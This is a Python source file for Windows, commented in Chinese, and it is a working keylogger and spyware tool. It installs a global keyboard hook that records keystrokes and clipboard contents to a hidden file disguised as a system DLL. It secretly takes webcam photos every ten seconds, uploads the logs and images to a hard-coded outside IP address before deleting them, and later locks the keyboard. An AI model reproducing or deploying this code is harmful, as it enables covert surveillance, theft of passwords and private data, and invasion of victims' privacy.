import sys, os, time
import socket, struct, json
import win32clipboard  # 剪贴板操作，需要安装pywin32才可以
import win32con
import win32api
import cv2

from ctypes import windll
from ctypes import CFUNCTYPE
from ctypes import POINTER
from ctypes import c_int, c_void_p
from ctypes import byref
from ctypes.wintypes import MSG

from threading import Timer
from threading import Thread
from threading import Lock


# 工具
class Utils:
    def __init__(self):
        # 用户家目录
        self.base_dir = os.path.expanduser('~') # 权限问题

        # 初始化生成日志文件
        self.log_path = r'%s/adhsvc.dll.system32' % self.base_dir
        open(self.log_path, 'a', encoding='utf-8').close()
        win32api.SetFileAttributes(self.log_path, win32con.FILE_ATTRIBUTE_HIDDEN)

        # 定义两把锁，控制读写
        self.mutex_log = Lock()  # 日志锁
        self.mutex_photo = Lock()  # 照片锁
        self.mutex_sock = Lock()  # 套接字上传锁
        # 服务端的ip和port
        self.server_ip = '115.29.65.16'
        self.server_port = 9999

        # 本地调试日志
        self.debug = True
        self.debug_log_path = r'%s/debug_log' % self.base_dir
        self.mutex_debug = Lock()

    def log_debug(self, res):
        if not self.debug: return
        self.mutex_debug.acquire()
        with open(self.debug_log_path, mode='a', encoding='utf-8') as f:
            f.write('\n%s\n' % res)
            f.flush()
        self.mutex_debug.release()

    def log(self, res):
        self.mutex_log.acquire()
        with open(self.log_path, mode='a', encoding='utf-8') as f:
            f.write(res)
            f.flush()
        self.mutex_log.release()

    def take_photoes(self):
        while True:
            time.sleep(10)
            photo_path = r'%s/%s.jpeg' % (self.base_dir, time.strftime('%Y-%m-%d_%H_%M_%S'))
            cap = None

            try:
                # VideoCapture()中第一个参数是摄像头标号，默认情况电脑自带摄像头索引为0，外置为1.2.3…，
                # 参数是视频文件路径则打开视频，如cap = cv2.VideoCapture(“../test.avi”)
                # CAP_DSHOW是微软特有的,cv2.release()之后摄像头依然开启，需要指定该参数
                cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                ret, frame = cap.read()
                self.mutex_photo.acquire()
                cv2.imwrite(photo_path, frame)
            except Exception as e:
                self.log_debug('照相异常： %s' % e)
            finally:
                # 无论如何都要释放锁，关闭相机
                self.mutex_photo.release()
                if cap is not None: cap.release() #None.release()
                cv2.destroyAllWindows()

            if os.path.exists(photo_path):
                win32api.SetFileAttributes(photo_path, win32con.FILE_ATTRIBUTE_HIDDEN)

    def send_data(self, headers, data):
        try:
            self.mutex_sock.acquire() # 上传数据的过程中不要做其他事情
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.server_ip, self.server_port))

            head_json = json.dumps(headers)
            head_json_bytes = bytes(head_json, encoding='utf-8')
            client.send(struct.pack('i', len(head_json_bytes)))
            client.send(head_json_bytes)
            client.sendall(data)
            client.close()

            res = (True, 'ok')
        except ConnectionRefusedError as e:
            msg = '套接字服务端未启动: %s' % e
            res = (False, msg)
        except Exception as e:
            msg = '套接字其他错误：%s' % e
            res = (False, msg)
        finally:
            self.mutex_sock.release()
        return res

    def upload_log(self):
        while True:
            time.sleep(1)

            if not os.path.getsize(self.log_path): continue

            self.mutex_log.acquire()
            with open(self.log_path, mode='rb+') as f:
                data = f.read()
                self.mutex_log.release()

                headers = {
                    'data_size': len(data),
                    'filename': os.path.basename(self.log_path)
                }

                self.log_debug('正在往服务端发送日志......[%s]' % data)

                is_ok, msg = self.send_data(headers, data)
                if is_ok:
                    self.log_debug('日志[%s]发送成功。。。' % data)
                else:
                    self.log_debug('日志[%s]发送失败：%s' % (data, msg))
                    continue

                f.truncate(0)

    def upload_photoes(self):
        while True:
            time.sleep(3)

            files = os.listdir(self.base_dir)
            files_jpeg = [file_name for file_name in files if file_name.endswith('jpeg')]
            for file_name in files_jpeg:
                file_path = r'%s/%s' % (self.base_dir, file_name)
                if not os.path.exists(file_path): continue

                self.log_debug('开始上传图片: %s' % file_name)
                headers = {
                    'data_size': os.path.getsize(file_path),
                    'filename': file_name
                }

                self.mutex_photo.acquire()
                with open(file_path, mode='rb+') as f:
                    data = f.read()
                self.mutex_photo.release()

                is_ok, msg = self.send_data(headers, data)
                if is_ok:
                    self.log_debug('图片%s发送完毕......' % file_name)
                else:
                    self.log_debug('图片%s发送失败：%s' % (file_name, msg))
                    continue

                os.remove(file_path)


utils = Utils()


# 定义类：定义拥有挂钩与拆钩功能的类
class Toad:
    def __init__(self):
        self.user32 = windll.user32
        self.hooked = None

    def __install_hook_proc(self, pointer):
        self.hooked = self.user32.SetWindowsHookExA(
            win32con.WH_KEYBOARD_LL,  # WH_KEYBOARD_LL = 13  # 全局的键盘钩子，能拦截所有的键盘按键的消息。
            pointer,
            0, # 钩子函数的dll句柄，此处设置为0即可
            0  # 所有线程
        ) # self.hooked 为注册钩子返回的句柄
        return True if self.hooked else False

    def install_hook_proc(self, func):
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        pointer = CMPFUNC(func)  # 拿到函数hookProc指针，

        if self.__install_hook_proc(pointer):
            utils.log_debug("%s start " % func.__name__)

        msg = MSG()
        # 监听/获取窗口的消息,消息进入队列后则取出交给勾链中第一个钩子
        self.user32.GetMessageA(byref(msg), None, 0, 0)

    def uninstall_hook_proc(self):
        if self.hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.hooked) # 通过钩子句柄删除注册的钩子
        self.hooked = None


toad_obj = Toad()


# 2、定义钩子过程（即我们要注入的逻辑）：
def monitor_keyborad_proc(nCode, wParam, lParam):
    # win32con.WM_KEYDOWN = 0X0100  # 键盘按下，对应数字256
    # win32con.WM_KEYUP = 0x101  # 键盘起来，对应数字257，监控键盘只需要操作KEYDOWN即可
    if wParam == win32con.WM_KEYDOWN:
        hookedKey_ascii = 0xFFFFFFFF & lParam[0]
        hookedKey = chr(hookedKey_ascii)

        utils.log_debug('监听到hookeKey：[%s]  hookedKey_ascii：[%s]' % (hookedKey, hookedKey_ascii))

        keyboard_dic = {
            220: r'<`>',
            189: r'<->',
            187: r'<=>',
            8: r'<删除键>',

            9: r'<tab>',
            219: r'<[>',
            221: r'<]>',
            222: r'<\>',

            20: r'<大小写锁定>',
            186: r'<;>',
            192: r"<'>",
            13: r'<enter>',

            160: r'<lshift>',
            188: r'<,>',
            190: r'<.>',
            191: r'</>',
            161: r'<rshift>',

            162: r'<ctrl>',
            32: r'<space>',
            37: r'<左箭头>',
            38: r'<上箭头>',
            39: r'<右箭头>',
            40: r'<下箭头>',
        }

        if (hookedKey == 'Q'):  # 测试时打开，正式运行时注释这一段即可
            toad_obj.uninstall_hook_proc()
            sys.exit(-1)
            # pass

        if hookedKey_ascii in keyboard_dic:  # 按下了了非常规键
            res = keyboard_dic[hookedKey_ascii]
            utils.log_debug('监听到输入: %s' % res)
            utils.log(res)

        if hookedKey_ascii > 32 and hookedKey_ascii < 127:  # 检测击键是否常规按键（非组合键等）
            if hookedKey == 'V' or hookedKey == 'C':
                win32clipboard.OpenClipboard()
                paste_value = win32clipboard.GetClipboardData()  # 获取粘贴板的值
                win32clipboard.CloseClipboard()

                if paste_value: # 剪贴板有值，则代表上述V和C的输入是组合键，用户输入的有效数据在剪贴板里放着
                    utils.log(paste_value)
                    utils.log_debug('粘贴值： %s' % paste_value)
            else:
                utils.log_debug('监听到输入: %s' % repr(hookedKey))
                utils.log(hookedKey)

    # CallNextHookEx将钩子的信息重新放回钩链中
    return windll.user32.CallNextHookEx(toad_obj.hooked, nCode, wParam, lParam)


# 钩链：钩1，钩2
def lock_keyboard_proc(nCode, wParam, lParam):
    utils.log_debug('锁定键盘程序正在执行。。。。。。。。')
    return 123123123123123


if __name__ == '__main__':
    # 监听键盘输入->并记录日志
    t1 = Thread(target=toad_obj.install_hook_proc, args=(monitor_keyborad_proc,))
    # 锁定键盘功能
    t2 = Timer(120, toad_obj.install_hook_proc, args=[lock_keyboard_proc, ])

    # 偷拍功能->保存图片文件
    t3 = Thread(target=utils.take_photoes)

    # 上传数据功能：日志文件、图片文件
    t4 = Thread(target=utils.upload_log)
    t5 = Thread(target=utils.upload_photoes)

    t2.daemon = True
    t3.daemon = True
    t4.daemon = True
    t5.daemon = True

    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()

    t1.join()



